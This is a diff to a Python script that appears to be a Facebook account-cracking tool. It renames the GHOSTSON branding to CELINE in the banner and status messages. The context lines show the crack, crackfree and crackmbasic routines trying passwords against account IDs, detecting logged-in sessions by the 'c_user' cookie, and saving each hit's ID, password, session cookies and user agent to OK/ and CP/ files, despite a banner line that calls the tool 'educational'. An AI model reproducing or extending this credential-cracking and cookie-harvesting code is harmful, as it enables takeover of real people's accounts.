@@ -207,7 +207,7 @@ def menu(my_name,my_id,my_birthday):
 	print("""%s DON'T USE THIS TOOL ILLEGAL🛑"""%(h))
 	print("""%s THIS TOOL WAS MADE FOR EDUCATIONAL PURPOSE 🛑"""%(h))
 	print("""%s CODED' BY 🛑 NAIJA🛑 """%(h))
-	print("""%s GHOSTSON TEAM® 🛑 RESERVED' COPYRIGHT YEAR' 2022 🛑 """%(h))
+	print("""%s CELINE TEAM® 🛑 RESERVED' COPYRIGHT YEAR' 2022 🛑 """%(h))
 	fx = mark(sg, style='green')
 	sol().print(fx)
 	print(h+'['+h+'➣'+h+'] ID USERNAME  : '+str(my_name))
@@ -654,7 +654,7 @@ def crack(idf,pwv):
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print(f'\r   {H}GHOSTSON-OK ✓ {idf}[][]{pw}|{kuki}{N}')
+					print(f'\r   {H}CELINE-OK ✓ {idf}[][]{pw}|{kuki}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
@@ -683,7 +683,7 @@ def crack(idf,pwv):
 					for muncul in apkKadaluarsa:
 						hit1+=1
 						infoakun += (f"[bold green][{hit1}] {muncul} {kadaluarsa[hit2]}[/bold green]\n")
-					print(f'\r   {H}GHOSTSON-OK ✓ {idf}[][]{pw}|{kuki}|{infoakun}{N}')
+					print(f'\r   {H}CELINE-OK ✓ {idf}[][]{pw}|{kuki}|{infoakun}{N}')
 					break
 
 
@@ -756,7 +756,7 @@ def crackfree(idf,pwv):
 					for muncul in apkKadaluarsa:
 						hit1+=1
 						infoakun += (f"[bold green][{hit1}] {muncul} {kadaluarsa[hit2]}[/bold green]\n")
-					print(f'\r   {H}GHOSTSON-OK ✓ {idf}[][]{pw}|{kuki}|{infoakun}{N}')
+					print(f'\r   {H}CELINE-OK ✓ {idf}[][]{pw}|{kuki}|{infoakun}{N}')
 					break
 
 
@@ -791,7 +791,7 @@ def crackmbasic(idf,pwv):
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 				else:
-					print(f'\r   {M}GHOSTSON-CP ✓  {idf}[][]{pw}{N}')
+					print(f'\r   {M}CELINE-CP ✓  {idf}[][]{pw}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -802,7 +802,7 @@ def crackmbasic(idf,pwv):
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print(f'\r   {H}GHOSTSON-OK ✓ {idf}[][]{pw}|{kuki}{N}')
+					print(f'\r   {H}CELINE-OK ✓ {idf}[][]{pw}|{kuki}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
@@ -831,7 +831,7 @@ def crackmbasic(idf,pwv):
 					for muncul in apkKadaluarsa:
 						hit1+=1
 						infoakun += (f"[bold green][{hit1}] {muncul} {kadaluarsa[hit2]}[/bold green]\n")
-					print(f'\r   {H}GHOSTSON-OK ✓  {idf}[][]{pw}|{kuki}|{infoakun}{N}')
+					print(f'\r   {H}CELINE-OK ✓  {idf}[][]{pw}|{kuki}|{infoakun}{N}')
 					break
 
 
@@ -914,10 +914,10 @@ def cek_opsi():
 						for opsii in opsi:
 							print('\r%s---> %s%s'%(kk,opsii.text,x))
 				except:
-					print('\r%s++++ %s|%s OKENWA-CP ✓       %s'%(b,id,pw,x))
+					print('\r%s++++ %s|%s CELINE-CP ✓       %s'%(b,id,pw,x))
 					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
 			elif "c_user" in ses.cookies.get_dict().keys():
-				print('\r%s++++ %s|%s GHOSTSON-OK ✓     %s'%(h,id,pw,x))
+				print('\r%s++++ %s|%s CELINE-OK ✓     %s'%(h,id,pw,x))
 			else:
 				print('\r%s++++ %s|%s ---> SALAH       %s'%(x,id,pw,x))
 			love+=1
